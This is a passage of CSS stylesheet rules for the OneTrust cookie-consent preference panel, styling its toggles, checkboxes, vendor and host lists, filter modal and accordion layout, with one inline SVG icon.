            position: relative;
            z-index: 1
        }

        #onetrust-pc-sdk .ot-tgl input:checked+.ot-switch .ot-switch-nob {
            background-color: #cddcf2;
            border: 1px solid #3860be
        }

        #onetrust-pc-sdk .ot-tgl input:checked+.ot-switch .ot-switch-nob:before {
            -webkit-transform: translateX(20px);
            -ms-transform: translateX(20px);
            transform: translateX(20px);
            background-color: #3860be;
            border-color: #3860be
        }

        #onetrust-pc-sdk .ot-tgl input:focus+.ot-switch {
            outline: #000 solid 1px
        }

        #onetrust-pc-sdk .ot-switch {
            position: relative;
            display: inline-block;
            width: 45px;
            height: 25px
        }

        #onetrust-pc-sdk .ot-switch-nob {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #f2f1f1;
            border: 1px solid #ddd;
            transition: all .2s ease-in 0s;
            -moz-transition: all .2s ease-in 0s;
            -o-transition: all .2s ease-in 0s;
            -webkit-transition: all .2s ease-in 0s;
            border-radius: 20px
        }

        #onetrust-pc-sdk .ot-switch-nob:before {
            position: absolute;
            content: "";
            height: 21px;
            width: 21px;
            bottom: 1px;
            background-color: #7d7d7d;
            -webkit-transition: .4s;
            transition: .4s;
            border-radius: 20px
        }

        #onetrust-pc-sdk .ot-chkbox input:checked~label::before {
            background-color: #3860be
        }

        #onetrust-pc-sdk .ot-chkbox input+label::after {
            content: none;
            color: #fff
        }

        #onetrust-pc-sdk .ot-chkbox input:checked+label::after {
            content: ""
        }

        #onetrust-pc-sdk .ot-chkbox input:focus+label::before {
            outline-style: solid;
            outline-width: 2px;
            outline-style: auto
        }

        #onetrust-pc-sdk .ot-chkbox label {
            position: relative;
            display: inline-block;
            padding-left: 30px;
            cursor: pointer;
            font-weight: 500
        }

        #onetrust-pc-sdk .ot-chkbox label::before,
        #onetrust-pc-sdk .ot-chkbox label::after {
            position: absolute;
            content: "";
            display: inline-block;
            border-radius: 3px
        }

        #onetrust-pc-sdk .ot-chkbox label::before {
            height: 18px;
            width: 18px;
            border: 1px solid #3860be;
            left: 0px;
            top: auto
        }

        #onetrust-pc-sdk .ot-chkbox label::after {
            height: 5px;
            width: 9px;
            border-left: 3px solid;
            border-bottom: 3px solid;
            transform: rotate(-45deg);
            -o-transform: rotate(-45deg);
            -ms-transform: rotate(-45deg);
            -webkit-transform: rotate(-45deg);
            left: 4px;
            top: 5px
        }

        #onetrust-pc-sdk .ot-label-txt {
            display: none
        }

        #onetrust-pc-sdk .ot-chkbox input,
        #onetrust-pc-sdk .ot-tgl input {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0
        }

        #onetrust-pc-sdk .ot-arw-cntr {
            float: right;
            position: relative
        }

        #onetrust-pc-sdk .ot-arw-cntr .ot-arw {
            width: 16px;
            height: 16px;
            margin-left: 5px;
            color: dimgray;
            display: inline-block;
            vertical-align: middle;
            -webkit-transition: all 300ms ease-in 0s;
            -moz-transition: all 300ms ease-in 0s;
            -o-transition: all 300ms ease-in 0s;
            transition: all 300ms ease-in 0s
        }

        #onetrust-pc-sdk input:checked~.ot-acc-hdr .ot-arw {
            transform: rotate(90deg);
            -o-transform: rotate(90deg);
            -ms-transform: rotate(90deg);
            -webkit-transform: rotate(90deg)
        }

        #onetrust-pc-sdk input[type=checkbox]:focus+.ot-acc-hdr {
            outline: #000 1px solid
        }

        #onetrust-pc-sdk .ot-tgl-cntr,
        #onetrust-pc-sdk .ot-arw-cntr {
            display: inline-block
        }

        #onetrust-pc-sdk .ot-tgl-cntr {
            width: 45px;
            float: right;
            margin-top: 2px
        }

        #onetrust-pc-sdk #ot-lst-cnt .ot-tgl-cntr {
            margin-top: 10px
        }

        #onetrust-pc-sdk .ot-always-active-subgroup {
            width: auto;
            padding-left: 0px !important;
            top: 3px;
            position: relative
        }

        #onetrust-pc-sdk .ot-label-status {
            padding-left: 5px;
            font-size: .75em;
            display: none
        }

        #onetrust-pc-sdk .ot-arw-cntr {
            margin-top: -1px
        }

        #onetrust-pc-sdk .ot-arw-cntr svg {
            -webkit-transition: all 300ms ease-in 0s;
            -moz-transition: all 300ms ease-in 0s;
            -o-transition: all 300ms ease-in 0s;
            transition: all 300ms ease-in 0s;
            height: 10px;
            width: 10px
        }

        #onetrust-pc-sdk input:checked~.ot-acc-hdr .ot-arw {
            transform: rotate(90deg);
            -o-transform: rotate(90deg);
            -ms-transform: rotate(90deg);
            -webkit-transform: rotate(90deg)
        }

        #onetrust-pc-sdk .ot-arw {
            width: 10px;
            margin-left: 15px;
            transition: all 300ms ease-in 0s;
            -webkit-transition: all 300ms ease-in 0s;
            -moz-transition: all 300ms ease-in 0s;
            -o-transition: all 300ms ease-in 0s
        }

        #onetrust-pc-sdk .ot-vlst-cntr {
            margin-bottom: 0
        }

        #onetrust-pc-sdk .ot-hlst-cntr {
            margin-top: 5px;
            display: inline-block;
            width: 100%
        }

        #onetrust-pc-sdk .category-vendors-list-handler,
        #onetrust-pc-sdk .category-vendors-list-handler+a,
        #onetrust-pc-sdk .category-host-list-handler {
            clear: both;
            color: #3860be;
            margin-left: 0;
            font-size: .813em;
            text-decoration: none;
            float: left;
            overflow: hidden
        }

        #onetrust-pc-sdk .category-vendors-list-handler:hover,
        #onetrust-pc-sdk .category-vendors-list-handler+a:hover,
        #onetrust-pc-sdk .category-host-list-handler:hover {
            color: #1883fd
        }

        #onetrust-pc-sdk .category-vendors-list-handler+a {
            clear: none
        }

        #onetrust-pc-sdk .category-vendors-list-handler+a::after {
            content: "";
            height: 15px;
            width: 15px;
            background-repeat: no-repeat;
            margin-left: 5px;
            float: right;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 511.626 511.627'%3E%3Cg fill='%231276CE'%3E%3Cpath d='M392.857 292.354h-18.274c-2.669 0-4.859.855-6.563 2.573-1.718 1.708-2.573 3.897-2.573 6.563v91.361c0 12.563-4.47 23.315-13.415 32.262-8.945 8.945-19.701 13.414-32.264 13.414H82.224c-12.562 0-23.317-4.469-32.264-13.414-8.945-8.946-13.417-19.698-13.417-32.262V155.31c0-12.562 4.471-23.313 13.417-32.259 8.947-8.947 19.702-13.418 32.264-13.418h200.994c2.669 0 4.859-.859 6.57-2.57 1.711-1.713 2.566-3.9 2.566-6.567V82.221c0-2.662-.855-4.853-2.566-6.563-1.711-1.713-3.901-2.568-6.57-2.568H82.224c-22.648 0-42.016 8.042-58.102 24.125C8.042 113.297 0 132.665 0 155.313v237.542c0 22.647 8.042 42.018 24.123 58.095 16.086 16.084 35.454 24.13 58.102 24.13h237.543c22.647 0 42.017-8.046 58.101-24.13 16.085-16.077 24.127-35.447 24.127-58.095v-91.358c0-2.669-.856-4.859-2.574-6.57-1.713-1.718-3.903-2.573-6.565-2.573z'/%3E%3Cpath d='M506.199 41.971c-3.617-3.617-7.905-5.424-12.85-5.424H347.171c-4.948 0-9.233 1.807-12.847 5.424-3.617 3.615-5.428 7.898-5.428 12.847s1.811 9.233 5.428 12.85l50.247 50.248-186.147 186.151c-1.906 1.903-2.856 4.093-2.856 6.563 0 2.479.953 4.668 2.856 6.571l32.548 32.544c1.903 1.903 4.093 2.852 6.567 2.852s4.665-.948 6.567-2.852l186.148-186.148 50.251 50.248c3.614 3.617 7.898 5.426 12.847 5.426s9.233-1.809 12.851-5.426c3.617-3.616 5.424-7.898 5.424-12.847V54.818c-.001-4.952-1.814-9.232-5.428-12.847z'/%3E%3C/g%3E%3C/svg%3E")
        }

        #onetrust-pc-sdk .back-btn-handler {
            font-size: 1em;
            text-decoration: none
        }

        #onetrust-pc-sdk .back-btn-handler:hover {
            opacity: .6
        }

        #onetrust-pc-sdk #ot-lst-title span {
            display: inline-block;
            word-break: break-word;
            word-wrap: break-word;
            margin-bottom: 0;
            color: #656565;
            font-size: 1em;
            font-weight: bold;
            margin-left: 15px
        }

        #onetrust-pc-sdk #ot-lst-title {
            margin: 10px 0 10px 0px;
            font-size: 1em;
            text-align: left
        }

        #onetrust-pc-sdk #ot-pc-hdr {
            margin: 0 0 0 30px;
            height: auto;
            width: auto
        }

        #onetrust-pc-sdk #ot-pc-hdr input::placeholder {
            color: #d4d4d4;
            font-style: italic
        }

        #onetrust-pc-sdk #vendor-search-handler {
            height: 31px;
            width: 100%;
            border-radius: 50px;
            font-size: .8em;
            padding-right: 35px;
            padding-left: 15px;
            float: left;
            margin-left: 15px
        }

        #onetrust-pc-sdk .ot-ven-name {
            display: block;
            width: auto;
            padding-right: 5px
        }

        #onetrust-pc-sdk #ot-lst-cnt {
            overflow-y: auto;
            margin-left: 20px;
            margin-right: 7px;
            width: calc(100% - 27px);
            max-height: calc(100% - 80px);
            height: 100%;
            transform: translate3d(0, 0, 0)
        }

        #onetrust-pc-sdk #ot-pc-lst {
            width: 100%;
            bottom: 100px;
            position: absolute;
            top: 60px
        }

        #onetrust-pc-sdk #ot-pc-lst:not(.ot-enbl-chr) .ot-tgl-cntr .ot-arw-cntr,
        #onetrust-pc-sdk #ot-pc-lst:not(.ot-enbl-chr) .ot-tgl-cntr .ot-arw-cntr * {
            visibility: hidden
        }

        #onetrust-pc-sdk #ot-pc-lst .ot-tgl-cntr {
            right: 12px;
            position: absolute
        }

        #onetrust-pc-sdk #ot-pc-lst .ot-arw-cntr {
            float: right;
            position: relative
        }

        #onetrust-pc-sdk #ot-pc-lst .ot-arw {
            margin-left: 10px
        }

        #onetrust-pc-sdk #ot-pc-lst .ot-acc-hdr {
            overflow: hidden;
            cursor: pointer
        }

        #onetrust-pc-sdk .ot-vlst-cntr {
            overflow: hidden
        }

        #onetrust-pc-sdk #ot-sel-blk {
            overflow: hidden;
            width: 100%;
            position: sticky;
            position: -webkit-sticky;
            top: 0;
            z-index: 3
        }

        #onetrust-pc-sdk #ot-back-arw {
            height: 12px;
            width: 12px
        }

        #onetrust-pc-sdk .ot-lst-subhdr {
            width: 100%;
            display: inline-block
        }

        #onetrust-pc-sdk .ot-search-cntr {
            float: left;
            width: 78%;
            position: relative
        }

        #onetrust-pc-sdk .ot-search-cntr>svg {
            width: 30px;
            height: 30px;
            position: absolute;
            float: left;
            right: -15px
        }

        #onetrust-pc-sdk .ot-fltr-cntr {
            float: right;
            right: 50px;
            position: relative
        }

        #onetrust-pc-sdk #filter-btn-handler {
            background-color: #3860be;
            border-radius: 17px;
            display: inline-block;
            position: relative;
            width: 32px;
            height: 32px;
            -moz-transition: .1s ease;
            -o-transition: .1s ease;
            -webkit-transition: 1s ease;
            transition: .1s ease;
            padding: 0;
            margin: 0
        }

        #onetrust-pc-sdk #filter-btn-handler:hover {
            background-color: #3860be
        }

        #onetrust-pc-sdk #filter-btn-handler svg {
            width: 12px;
            height: 12px;
            margin: 3px 10px 0 10px;
            display: block;
            position: static;
            right: auto;
            top: auto
        }

        #onetrust-pc-sdk .ot-ven-link {
            color: #3860be;
            text-decoration: none;
            font-weight: 100;
            display: inline-block;
            padding-top: 10px;
            transform: translate(0, 1%);
            -o-transform: translate(0, 1%);
            -ms-transform: translate(0, 1%);
            -webkit-transform: translate(0, 1%);
            position: relative;
            z-index: 2
        }

        #onetrust-pc-sdk .ot-ven-link * {
            font-size: inherit
        }

        #onetrust-pc-sdk .ot-ven-link:hover {
            text-decoration: underline
        }

        #onetrust-pc-sdk .ot-ven-hdr {
            width: calc(100% - 160px);
            height: auto;
            float: left;
            word-break: break-word;
            word-wrap: break-word;
            vertical-align: middle;
            padding-bottom: 3px
        }

        #onetrust-pc-sdk .ot-ven-link {
            letter-spacing: .03em;
            font-size: .75em;
            font-weight: 400
        }

        #onetrust-pc-sdk .ot-ven-dets {
            border-radius: 2px;
            background-color: #f8f8f8
        }

        #onetrust-pc-sdk .ot-ven-dets div:first-child p:first-child {
            border-top: none
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:not(:first-child) {
            border-top: 1px solid #e9e9e9
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:nth-child(n+3) p {
            display: inline-block
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:nth-child(n+3) p:nth-of-type(odd) {
            width: 30%
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:nth-child(n+3) p:nth-of-type(even) {
            width: 50%;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc p {
            padding-top: 5px;
            padding-bottom: 5px;
            display: block
        }

        #onetrust-pc-sdk .ot-ven-dets p {
            font-size: .69em;
            text-align: left;
            vertical-align: middle;
            word-break: break-word;
            word-wrap: break-word;
            margin: 0;
            padding-bottom: 10px;
            padding-left: 15px;
            color: #2e3644
        }

        #onetrust-pc-sdk .ot-ven-dets p:first-child {
            padding-top: 5px
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-pur p:first-child {
            border-top: 1px solid #e9e9e9;
            border-bottom: 1px solid #e9e9e9;
            padding-bottom: 5px;
            margin-bottom: 5px;
            font-weight: bold
        }

        #onetrust-pc-sdk #ot-host-lst .ot-sel-all {
            float: right;
            position: relative;
            margin-right: 42px;
            top: 10px
        }

        #onetrust-pc-sdk #ot-host-lst .ot-sel-all input[type=checkbox] {
            width: auto;
            height: auto
        }

        #onetrust-pc-sdk #ot-host-lst .ot-sel-all label {
            height: 20px;
            width: 20px;
            padding-left: 0px
        }

        #onetrust-pc-sdk #ot-host-lst .ot-acc-txt {
            overflow: hidden;
            width: 95%
        }

        #onetrust-pc-sdk .ot-host-hdr {
            width: calc(100% - 125px);
            float: left
        }

        #onetrust-pc-sdk .ot-host-name,
        #onetrust-pc-sdk .ot-host-desc {
            display: inline-block;
            width: 90%
        }

        #onetrust-pc-sdk .ot-host-hdr>a {
            text-decoration: underline;
            font-size: .82em;
            position: relative;
            z-index: 2;
            float: left;
            margin-bottom: 5px
        }

        #onetrust-pc-sdk .ot-host-name+a {
            margin-top: 5px
        }

        #onetrust-pc-sdk .ot-host-name,
        #onetrust-pc-sdk .ot-host-name a,
        #onetrust-pc-sdk .ot-host-desc,
        #onetrust-pc-sdk .ot-host-info {
            color: dimgray;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-pc-sdk .ot-host-name,
        #onetrust-pc-sdk .ot-host-name a {
            font-weight: bold;
            font-size: .82em;
            line-height: 1.3
        }

        #onetrust-pc-sdk .ot-host-name a {
            font-size: 1em
        }

        #onetrust-pc-sdk .ot-host-expand {
            margin-top: 3px;
            margin-bottom: 3px;
            clear: both;
            display: block;
            color: #3860be;
            font-size: .72em;
            font-weight: normal
        }

        #onetrust-pc-sdk .ot-host-expand * {
            font-size: inherit
        }

        #onetrust-pc-sdk .ot-host-desc,
        #onetrust-pc-sdk .ot-host-info {
            font-size: .688em;
            line-height: 1.4;
            font-weight: normal
        }

        #onetrust-pc-sdk .ot-host-desc {
            margin-top: 10px
        }

        #onetrust-pc-sdk .ot-host-opt {
            margin: 0;
            font-size: inherit;
            display: inline-block;
            width: 100%
        }

        #onetrust-pc-sdk .ot-host-opt li>div div {
            font-size: .8em;
            padding: 5px 0
        }

        #onetrust-pc-sdk .ot-host-opt li>div div:nth-child(1) {
            width: 30%;
            float: left
        }

        #onetrust-pc-sdk .ot-host-opt li>div div:nth-child(2) {
            width: 70%;
            float: left;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-pc-sdk .ot-host-info {
            border: none;
            display: inline-block;
            width: calc(100% - 10px);
            padding: 10px;
            margin-bottom: 10px;
            background-color: #f8f8f8
        }

        #onetrust-pc-sdk .ot-host-info>div {
            overflow: auto
        }

        #onetrust-pc-sdk #no-results {
            text-align: center;
            margin-top: 30px
        }

        #onetrust-pc-sdk #no-results p {
            font-size: 1em;
            color: #2e3644;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-pc-sdk #no-results p span {
            font-weight: bold
        }

        #onetrust-pc-sdk #ot-fltr-modal {
            width: 100%;
            height: auto;
            display: none;
            -moz-transition: .2s ease;
            -o-transition: .2s ease;
            -webkit-transition: 2s ease;
            transition: .2s ease;
            overflow: hidden;
            opacity: 1;
            right: 0
        }

        #onetrust-pc-sdk #ot-fltr-modal .ot-label-txt {
            display: inline-block;
            font-size: .85em;
            color: dimgray
        }

        #onetrust-pc-sdk #ot-fltr-cnt {
            z-index: 2147483646;
            background-color: #fff;
            position: absolute;
            height: 90%;
            max-height: 300px;
            width: 325px;
            left: 210px;
            margin-top: 10px;
            margin-bottom: 20px;
            padding-right: 10px;
            border-radius: 3px;
            -webkit-box-shadow: 0px 0px 12px 2px #c7c5c7;
            -moz-box-shadow: 0px 0px 12px 2px #c7c5c7;
            box-shadow: 0px 0px 12px 2px #c7c5c7
        }

        #onetrust-pc-sdk .ot-fltr-scrlcnt {
            overflow-y: auto;
            overflow-x: hidden;
            clear: both;
            max-height: calc(100% - 60px)
        }

        #onetrust-pc-sdk #ot-anchor {
            border: 12px solid transparent;
            display: none;
            position: absolute;
            z-index: 2147483647;
            right: 55px;
            top: 75px;
            transform: rotate(45deg);
            -o-transform: rotate(45deg);
            -ms-transform: rotate(45deg);
            -webkit-transform: rotate(45deg);
            background-color: #fff;
            -webkit-box-shadow: -3px -3px 5px -2px #c7c5c7;
            -moz-box-shadow: -3px -3px 5px -2px #c7c5c7;
            box-shadow: -3px -3px 5px -2px #c7c5c7
        }

        #onetrust-pc-sdk .ot-fltr-btns {
            margin-left: 15px
        }

        #onetrust-pc-sdk #filter-apply-handler {
            margin-right: 15px
        }

        #onetrust-pc-sdk .ot-fltr-opt {
            margin-bottom: 25px;
            margin-left: 15px;
            width: 75%;
            position: relative
        }

        #onetrust-pc-sdk .ot-fltr-opt p {
            display: inline-block;
            margin: 0;
            font-size: .9em;
            color: #2e3644
        }

        #onetrust-pc-sdk .ot-chkbox label span {
            font-size: .85em;
            color: dimgray
        }

        #onetrust-pc-sdk .ot-chkbox input[type=checkbox]+label::after {
            content: none;
            color: #fff
        }

        #onetrust-pc-sdk .ot-chkbox input[type=checkbox]:checked+label::after {
            content: ""
        }

        #onetrust-pc-sdk .ot-chkbox input[type=checkbox]:focus+label::before {
            outline-style: solid;
            outline-width: 2px;
            outline-style: auto
        }

        #onetrust-pc-sdk #ot-selall-vencntr,
        #onetrust-pc-sdk #ot-selall-adtlvencntr,
        #onetrust-pc-sdk #ot-selall-hostcntr,
        #onetrust-pc-sdk #ot-selall-licntr,
        #onetrust-pc-sdk #ot-selall-gnvencntr {
            right: 15px;
            position: relative;
            width: 20px;
            height: 20px;
            float: right
        }

        #onetrust-pc-sdk #ot-selall-vencntr label,
        #onetrust-pc-sdk #ot-selall-adtlvencntr label,
        #onetrust-pc-sdk #ot-selall-hostcntr label,
        #onetrust-pc-sdk #ot-selall-licntr label,
        #onetrust-pc-sdk #ot-selall-gnvencntr label {
            float: left;
            padding-left: 0
        }

        #onetrust-pc-sdk #ot-ven-lst:first-child {
            border-top: 1px solid #e2e2e2
        }

        #onetrust-pc-sdk ul {
            list-style: none;
            padding: 0
        }

        #onetrust-pc-sdk ul li {
            position: relative;
            margin: 0;
            padding: 15px 15px 15px 10px;
            border-bottom: 1px solid #e2e2e2
        }

        #onetrust-pc-sdk ul li h3 {
            font-size: .75em;
            color: #656565;
            margin: 0;
            display: inline-block;
            width: 70%;
            height: auto;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-pc-sdk ul li p {
            margin: 0;
            font-size: .7em
        }

        #onetrust-pc-sdk ul li input[type=checkbox] {
            position: absolute;
            cursor: pointer;
            width: 100%;
            height: 100%;
            opacity: 0;
            margin: 0;
            top: 0;
            left: 0
        }

        #onetrust-pc-sdk .ot-cat-item>button:focus,
        #onetrust-pc-sdk .ot-acc-cntr>button:focus,
        #onetrust-pc-sdk li>button:focus {
            outline: #000 solid 2px
        }

        #onetrust-pc-sdk .ot-cat-item>button,
        #onetrust-pc-sdk .ot-acc-cntr>button,
        #onetrust-pc-sdk li>button {
            position: absolute;
            cursor: pointer;
            width: 100%;
            height: 100%;
            margin: 0;
            top: 0;
            left: 0;
            z-index: 1;
            max-width: none;
            border: none
        }

        #onetrust-pc-sdk .ot-cat-item>button[aria-expanded=false]~.ot-acc-txt,
        #onetrust-pc-sdk .ot-acc-cntr>button[aria-expanded=false]~.ot-acc-txt,
        #onetrust-pc-sdk li>button[aria-expanded=false]~.ot-acc-txt {
            margin-top: 0;
            max-height: 0;
            opacity: 0;
            overflow: hidden;
            width: 100%;
            transition: .25s ease-out;
            display: none
        }

        #onetrust-pc-sdk .ot-cat-item>button[aria-expanded=true]~.ot-acc-txt,
        #onetrust-pc-sdk .ot-acc-cntr>button[aria-expanded=true]~.ot-acc-txt,
        #onetrust-pc-sdk li>button[aria-expanded=true]~.ot-acc-txt {
            transition: .1s ease-in;
            margin-top: 10px;
            width: 100%;
            overflow: auto;
            display: block
        }

        #onetrust-pc-sdk .ot-cat-item>button[aria-expanded=true]~.ot-acc-grpcntr,
        #onetrust-pc-sdk .ot-acc-cntr>button[aria-expanded=true]~.ot-acc-grpcntr,
        #onetrust-pc-sdk li>button[aria-expanded=true]~.ot-acc-grpcntr {
            width: auto;
            margin-top: 0px;
            padding-bottom: 10px
        }

        #onetrust-pc-sdk .ot-host-item>button:focus,
        #onetrust-pc-sdk .ot-ven-item>button:focus {
            outline: 0;
            border: 2px solid #000
        }

        #onetrust-pc-sdk .ot-hide-acc>button {
            pointer-events: none
        }

        #onetrust-pc-sdk .ot-hide-acc .ot-plus-minus>*,
        #onetrust-pc-sdk .ot-hide-acc .ot-arw-cntr>* {
            visibility: hidden
        }

        #onetrust-pc-sdk .ot-hide-acc .ot-acc-hdr {
            min-height: 30px
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) {
            padding-right: 10px;
            width: calc(100% - 37px);
            margin-top: 10px;
            max-height: calc(100% - 90px)
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) #ot-sel-blk {
            background-color: #f9f9fc;
            border: 1px solid #e2e2e2;
            width: calc(100% - 2px);
            padding-bottom: 5px;
            padding-top: 5px
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-sel-all {
            padding-right: 34px
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-sel-all-chkbox {
            width: auto
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) ul li {
            border: 1px solid #e2e2e2;
            margin-bottom: 10px
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-acc-cntr>.ot-acc-hdr {
            padding: 10px 0 10px 15px
        }

        #onetrust-pc-sdk.ot-addtl-vendors .ot-sel-all-chkbox {
            float: right
        }

        #onetrust-pc-sdk.ot-addtl-vendors .ot-plus-minus~.ot-sel-all-chkbox {
            right: 34px
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-ven-lst:first-child {
            border-top: none
        }

        #onetrust-pc-sdk .ot-acc-cntr {
            position: relative;
            border-left: 1px solid #e2e2e2;
            border-right: 1px solid #e2e2e2;
            border-bottom: 1px solid #e2e2e2
        }

        #onetrust-pc-sdk .ot-acc-cntr input {
            z-index: 1
        }

        #onetrust-pc-sdk .ot-acc-cntr>.ot-acc-hdr {
            background-color: #f9f9fc;
            padding: 5px 0 5px 15px;
            width: auto
        }

        #onetrust-pc-sdk .ot-acc-cntr>.ot-acc-hdr .ot-plus-minus {
            vertical-align: middle;
            top: auto
        }

        #onetrust-pc-sdk .ot-acc-cntr>.ot-acc-hdr .ot-arw-cntr {
            right: 10px
        }

        #onetrust-pc-sdk .ot-acc-cntr>.ot-acc-hdr input {
            z-index: 2
        }

        #onetrust-pc-sdk .ot-acc-cntr>input[type=checkbox]:checked~.ot-acc-hdr {
            border-bottom: 1px solid #e2e2e2
        }

        #onetrust-pc-sdk .ot-acc-cntr>.ot-acc-txt {
            padding-left: 10px;
            padding-right: 10px
        }

        #onetrust-pc-sdk .ot-acc-cntr button[aria-expanded=true]~.ot-acc-txt {
            width: auto
        }

        #onetrust-pc-sdk .ot-acc-cntr .ot-addtl-venbox {
            display: none
        }

        #onetrust-pc-sdk .ot-vlst-cntr {
            margin-bottom: 0;
            width: 100%
        }

        #onetrust-pc-sdk .ot-vensec-title {
            font-size: .813em;
            vertical-align: middle;
            display: inline-block
        }

        #onetrust-pc-sdk .category-vendors-list-handler,
        #onetrust-pc-sdk .category-vendors-list-handler+a {
            margin-left: 0;
            margin-top: 10px
        }

        #onetrust-pc-sdk #ot-selall-vencntr.line-through label::after,
        #onetrust-pc-sdk #ot-selall-adtlvencntr.line-through label::after,
        #onetrust-pc-sdk #ot-selall-licntr.line-through label::after,
        #onetrust-pc-sdk #ot-selall-hostcntr.line-through label::after,
        #onetrust-pc-sdk #ot-selall-gnvencntr.line-through label::after {
            height: auto;
            border-left: 0;
            transform: none;
            -o-transform: none;
            -ms-transform: none;
            -webkit-transform: none;
            left: 5px;
            top: 9px
        }

        #onetrust-pc-sdk #ot-category-title {
            float: left;
            padding-bottom: 10px;
            font-size: 1em;
            width: 100%
        }

        #onetrust-pc-sdk .ot-cat-grp {
            margin-top: 10px
        }

        #onetrust-pc-sdk .ot-cat-item {
            line-height: 1.1;
            margin-top: 10px;
            display: inline-block;
            width: 100%
        }

        #onetrust-pc-sdk .ot-btn-container {
            text-align: right
        }

        #onetrust-pc-sdk .ot-btn-container button {
            display: inline-block;
            font-size: .75em;
            letter-spacing: .08em;
            margin-top: 19px
        }

        #onetrust-pc-sdk #close-pc-btn-handler.ot-close-icon {
            position: absolute;
            top: 10px;
            right: 0;
            z-index: 1;
            padding: 0;
            background-color: transparent;
            border: none
        }

        #onetrust-pc-sdk #close-pc-btn-handler.ot-close-icon:hover {
            opacity: .7
        }

        #onetrust-pc-sdk #close-pc-btn-handler.ot-close-icon svg {
            display: block;
            height: 10px;
            width: 10px
        }

        #onetrust-pc-sdk #clear-filters-handler {
            margin-top: 20px;
            margin-bottom: 10px;
            float: right;
            max-width: 200px;
            text-decoration: none;
            color: #3860be;
            font-size: .9em;
            font-weight: bold;
            background-color: transparent;
            border-color: transparent;
            padding: 1px
        }

        #onetrust-pc-sdk #clear-filters-handler:hover {
            color: #2285f7
        }

        #onetrust-pc-sdk #clear-filters-handler:focus {
            outline: #000 solid 1px
        }

        #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item {
            position: relative;
            border-radius: 2px;
            margin: 0;
            padding: 0;
            border: 1px solid #d8d8d8;
            border-top: none;
            width: calc(100% - 2px);
            float: left
        }

        #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item:first-of-type {
            margin-top: 10px;
            border-top: 1px solid #d8d8d8
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpdesc {
            padding-left: 20px;
            padding-right: 20px;
            width: calc(100% - 40px);
            font-size: .812em;
            margin-bottom: 10px;
            margin-top: 15px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpdesc>ul {
            padding-top: 10px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpdesc>ul li {
            padding-top: 0;
            line-height: 1.5;
            padding-bottom: 10px
        }

        #onetrust-pc-sdk .ot-accordion-layout div+.ot-acc-grpdesc {
            margin-top: 5px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-vlst-cntr:first-child {
            margin-top: 10px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-vlst-cntr:last-child,
        #onetrust-pc-sdk .ot-accordion-layout .ot-hlst-cntr:last-child {
            margin-bottom: 5px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-hdr {
            padding-top: 11.5px;
            padding-bottom: 11.5px;
            padding-left: 20px;
            padding-right: 20px;
            width: calc(100% - 40px);
            display: inline-block
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-txt {
            width: 100%;
            padding: 0px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-subgrp-cntr {
            padding-left: 20px;
            padding-right: 15px;
            padding-bottom: 0;
            width: calc(100% - 35px)
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-subgrp {
            padding-right: 5px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpcntr {
            z-index: 1;
            position: relative
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-cat-header+.ot-arw-cntr {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            right: 20px;
            margin-top: -2px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-cat-header+.ot-arw-cntr .ot-arw {
            width: 15px;
            height: 20px;
            margin-left: 5px;
            color: dimgray
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-cat-header {
            float: none;
            color: #2e3644;
            margin: 0;
            display: inline-block;
            height: auto;
            word-wrap: break-word;
            min-height: inherit
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-vlst-cntr,
        #onetrust-pc-sdk .ot-accordion-layout .ot-hlst-cntr {
            padding-left: 20px;
            width: calc(100% - 20px);
            display: inline-block;
            margin-top: 0px;
            padding-bottom: 2px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-hdr {
            position: relative;
            min-height: 25px
        }

        #onetrust-pc-sdk .ot-accordion-layout h4~.ot-tgl,
        #onetrust-pc-sdk .ot-accordion-layout h4~.ot-always-active {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            right: 20px
        }

        #onetrust-pc-sdk .ot-accordion-layout h4~.ot-tgl+.ot-tgl {
            right: 95px
        }

        #onetrust-pc-sdk .ot-accordion-layout .category-vendors-list-handler,
        #onetrust-pc-sdk .ot-accordion-layout .category-vendors-list-handler+a {
            margin-top: 5px
        }

